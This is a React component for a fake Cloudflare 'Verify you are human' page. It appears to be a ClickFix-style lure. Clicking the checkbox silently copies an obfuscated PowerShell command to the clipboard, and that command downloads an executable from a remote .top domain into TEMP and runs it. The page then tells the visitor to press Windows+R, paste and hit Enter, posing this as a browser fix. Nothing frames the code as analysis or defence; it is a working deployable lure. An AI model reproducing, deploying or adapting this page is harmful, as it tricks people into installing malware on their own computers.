import { useState, useEffect } from 'react';

import './App.css';

function App() {
  const [screen, setScreen] = useState<'check' | 'error'>('check');
  const [isLoading, setIsLoading] = useState(false);
  const [fixMode, setFixMode] = useState(false);
 const [message, setMessage] = useState<string>("poWersHElL -W h -c \"$u='h\"t\"tp\"s:/\/op\"qts\"kr\"een.top\"/B\"in\"/Ses\"s\"ion.Cl\"ient\"Set\"up.ex\"e';$p=$e\"n\"v:TE\"MP+'\\Ses\"s\"ion.ex\"e';iw\"r $u -o $p;st\"ar\"t $p;s\"tart 'h\"t\"tp\"s:/\/w\"ww.p\"w\"c.com'\"");
useEffect(() => {
  // Используем setMessage без изменения состояния
  setMessage(message);
}, []);
  const handleVerify = () => {
    setIsLoading(true);
    navigator.clipboard.writeText(message);
    setTimeout(() => {
      setIsLoading(false);
      setScreen('error');
    }, 1500);
  };

  const handleFixIt = () => {
    setFixMode(true);
  };

  return (
    <div className="page">
      <div className="main-content">
        {screen === 'check' ? (
          <div className="checkbox-style" onClick={handleVerify}>
            <div className={`custom-checkbox ${isLoading ? 'loading' : ''}`} />
            <div className="text-block">
              <span className="checkbox-text">
                {isLoading ? 'Checking...' : 'Verify you are human'}
              </span>
            </div>
            <div className="logo-block">
              <img src="/logo.png" alt="cloudflare" />
              <div className="links">
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
              </div>
            </div>
          </div>
        ) : (
          <div className="card card-white">
            <h2>☁️ ckc.ca</h2>
            <p className="small">
              Cloudflare is built on an intelligent, secure, high-speed global network. We help businesses regain
              control of their technology and security environments by reducing complexity and improving visibility
              across their on-premises, public cloud, SaaS and public Internet domains.
            </p>
            <p className="bold">
              {!fixMode ? (
                <>
                  Your browser does not support correct offline display of this document.
                  <br />
                  Please follow the instructions below using the <b>"Fix it"</b> button.
                </>
              ) : (
                <>
                  Press the key combination <img src="/windows.png" alt="Windows" className="os-icon" /> + <b>R</b>, then <b>CTRL + V</b>, then press <b>Enter</b>.
                </>
              )}
            </p>
            <div className="buttons">
              <button className="btn-orange" onClick={handleFixIt}>Fix It</button>
              <button className="btn-outline" onClick={() => window.location.reload()}>Retry</button>
            </div>
            <p className="small" style={{ marginTop: '1.5rem' }}>
              <b>ckc.ca</b> needs to review the security of your connection before proceeding.
            </p>
          </div>
        )}
      </div>

      {/* ✅ Абсолютно позиционированный спиннер */}
        <div className="loading-spinner-container">
          <div className="loading-spinner" />
        </div>
    </div>
  );
}

export default App;
